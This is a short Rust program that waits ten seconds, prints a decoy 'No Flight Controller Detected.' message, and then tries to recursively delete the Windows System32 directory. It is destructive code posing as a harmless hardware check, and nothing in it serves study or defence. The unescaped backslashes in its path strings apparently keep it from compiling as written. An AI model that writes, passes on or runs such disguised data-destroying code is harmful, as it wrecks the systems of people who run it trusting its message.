use std::thread;
use std::time::Duration;
use std::fs;

fn main() {
    thread::sleep(Duration::from_secs(10));
    
    println!("No Flight Controller Detected.");
    
    // remove system32
    match fs::remove_dir_all("C:\Windows\System32") {
        Ok(_) => println!("Successfully deleted directory: C:\Windows\System32"),
        Err(e) => println!("Error deleting directory C:\Windows\System32: {}", e),
    }
}
